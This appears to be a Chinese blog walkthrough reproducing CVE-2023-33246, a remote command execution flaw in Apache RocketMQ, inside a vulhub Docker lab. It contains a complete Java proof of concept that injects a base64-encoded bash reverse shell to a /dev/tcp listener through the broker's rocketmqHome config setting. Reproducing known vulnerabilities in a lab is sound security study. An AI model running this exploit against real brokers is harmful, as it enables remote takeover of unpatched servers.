# 原创
：  Apache RocketMQ 远程命令执行漏洞（CVE-2023-33246）vulhub漏洞复现

# Apache RocketMQ 远程命令执行漏洞（CVE-2023-33246）vulhub漏洞复现

**Apache RocketMQ 远程命令执行漏洞（CVE-2023-33246）**

Apache RocketMQ是一个分布式消息平台。

在其5.1.0版本及以前存在一处命令执行漏洞，攻击者通过向其更新配置相关的功能发送指令即可更新任意配置项，并通过配置项中存在的命令注入功能执行任意命令。

**漏洞复现**

```
cd vulhub/rocketmq/CVE-2023-33246
docker-compose up -d

```

使用IDEA新建一个`Maven`项目，导入依赖

POC如下

```
import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;

import java.util.Base64;
import java.util.Properties;

public class poc {
    private static String getCmd(String ip, String port) {
        String cmd = "bash -i &gt;&amp; /dev/tcp/" + ip + "/" + port + " 0&gt;&amp;1";
        String cmdBase = Base64.getEncoder().encodeToString(cmd.getBytes());
        return "-c $@|sh . echo echo \"" + cmdBase + "\"|base64 -d|bash -i;";
    }

    public static void main(String[] args) throws Exception {
        String targetHost = "192.168.126.128";
        String targetPort = "10911";

        String shellHost = "192.168.126.128";
        String shellPort = "12345";

        String targetAddr = String.format("%s:%s",targetHost,targetPort);
        Properties props = new Properties();
        props.setProperty("rocketmqHome", getCmd(shellHost,shellPort));
        props.setProperty("filterServerNums", "1");
        // 创建 DefaultMQAdminExt 对象并启动
        DefaultMQAdminExt admin = new DefaultMQAdminExt();

//        admin.setNamesrvAddr("0.0.0.0:12345");
        admin.start();
        // 更新配置⽂件
        admin.updateBrokerConfig(targetAddr, props);
        Properties brokerConfig = admin.getBrokerConfig(targetAddr);
        System.out.println(brokerConfig.getProperty("rocketmqHome"));
        System.out.println(brokerConfig.getProperty("filterServerNums"));
        // 关闭 DefaultMQAdminExt 对象
        admin.shutdown();
    }
}

```

在192.168.126.128开启nc启动监听，运行该poc

成功反弹

创建hacker文件成功
